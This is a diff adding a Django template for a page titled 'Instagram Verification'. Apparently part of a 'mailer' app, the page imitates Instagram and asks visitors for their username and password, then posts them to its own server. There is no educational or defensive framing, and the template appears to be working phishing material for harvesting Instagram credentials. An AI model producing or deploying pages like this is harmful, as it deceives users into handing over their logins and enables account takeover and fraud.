@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    {% load static %}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification</title>
+    <link rel="stylesheet" href="{% static 'mailer/css/styles.css' %}">
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="header">
+            <img src="{% static 'mailer/img/logo.jpeg' %}" alt="Logo">
+        </div>
+        <h2 class="font">Verification</h2>
+        <form id="contactForm" method="POST" action="">
+            {% csrf_token %}
+            <div class="form-group">
+                <!-- Username Field -->
+                <label for="id_username">Username:</label>
+                <input type="text" id="id_username" name="username" maxlength="255" required>
+                <div id="usernameError" style="display:none; color: red;">
+                    Username must be at least 4 characters long.
+                </div>
+            </div>
+
+            <div class="form-group">
+                <!-- Password Field -->
+                <label for="id_password">Password:</label>
+                <input type="password" id="id_password" name="password" required>
+                <div id="passwordError" style="display:none; color: red;">
+                    Password must be at least 6 characters long.
+                </div>
+            </div>
+
+            <button type="submit" class="login-btn">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('contactForm').addEventListener('submit', function (event) {
+            let valid = true;
+
+            const username = document.getElementById('id_username').value;
+            const usernameError = document.getElementById('usernameError');
+            if (username.length < 4) {
+                usernameError.style.display = 'block';
+                valid = false;
+            } else {
+                usernameError.style.display = 'none';
+            }
+
+            const password = document.getElementById('id_password').value;
+            const passwordError = document.getElementById('passwordError');
+            if (password.length < 6) {
+                passwordError.style.display = 'block';
+                valid = false;
+            } else {
+                passwordError.style.display = 'none';
+            }
+
+            if (!valid) {
+                event.preventDefault();
+            }
+        });
+    </script>
+</body>
+
+</html>
